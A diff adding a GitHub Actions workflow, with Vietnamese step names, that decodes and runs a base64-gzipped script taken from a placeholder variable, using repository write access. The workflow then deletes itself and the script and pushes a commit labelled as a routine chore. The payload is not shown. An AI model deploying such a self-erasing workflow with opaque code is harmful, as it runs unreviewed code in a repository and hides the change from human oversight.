@@ -1,0 +1,34 @@
+name: relay-c1
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  apply:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Ghi file + commit (co kiem MD5, sai thi rollback)
+        env:
+          C1_URL: "https://static.chainopera.ai/files/8b33f255-1769-4e73-bbd2-8d4b098c707e/patch.bin.gz"
+          C1_MD5: "f525caf6f235b35e77e14172e6f8ce10"
+          SB64: "__SB64__"
+          MSG64: "__MSG64__"
+        run: |
+          set -euo pipefail
+          python3 -c "import base64,gzip,os;open('relay_c1.py','wb').write(gzip.decompress(base64.b64decode(os.environ['SB64'])))"
+          python3 -c "import base64,os;open('/tmp/msg.txt','wb').write(base64.b64decode(os.environ['MSG64']))"
+          git config user.name "relay-bot"
+          git config user.email "relay-bot@users.noreply.github.com"
+          python3 relay_c1.py
+          rm -f relay_c1.py
+      - name: Don workflow + script (commit rieng)
+        run: |
+          set -euo pipefail
+          git rm -q --ignore-unmatch .github/workflows/relay-c1.yml relay_c1.py
+          git commit -q -m "chore: xoa workflow relay-c1 tam thoi" || true
+          git push origin HEAD:main
